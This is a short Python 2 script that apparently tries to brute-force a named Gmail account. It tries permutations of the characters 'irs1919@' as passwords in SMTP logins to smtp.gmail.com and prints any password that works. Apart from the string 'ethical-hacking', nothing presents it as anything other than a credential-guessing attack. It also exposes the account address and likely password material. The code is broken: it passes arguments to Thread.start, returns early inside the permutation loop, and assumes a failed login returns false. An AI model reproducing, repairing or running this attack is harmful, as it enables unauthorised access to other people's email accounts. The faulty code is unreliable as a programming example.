import smtplib
import thread
import threading
import time


exitFlag = 0

class myThread (threading.Thread):

	def __init__(self, threadID, name, counter):
		threading.Thread.__init__(self)
		self.threadID = threadID
		self.name = name
		self.counter = counter

	def run(self,pwd):
		fromaddr = 'hellobheri@gmail.com'
		toaddrs  = 'hellobheri@gmail.com'

		msg = 'ethical-hacking'
		username = 'hellobheri@gmail.com'
		password= pwd

		server = smtplib.SMTP('smtp.gmail.com:587')
		server.starttls()
		if(server.login(username,password)):
			print password
		server.quit()


thread1 = myThread(1, "Thread-1", 1)
thread2 = myThread(2, "Thread-2", 2)

def permutation(lst):
 
	if len(lst) == 0:
		return []

	if len(lst) == 1:
		return [lst]
	l = [] 

	for i in range(len(lst)):
		m = lst[i]

		remLst = lst[:i] + lst[i+1:]

		for p in permutation(remLst):
		   l.append([m] + p)
		return l

data = list('irs1919@')
for p in permutation(data):
	password= "".join(str(x) for x in p)
	thread1.start(password)
	#thread2.start()

print "Exiting Main Thread"
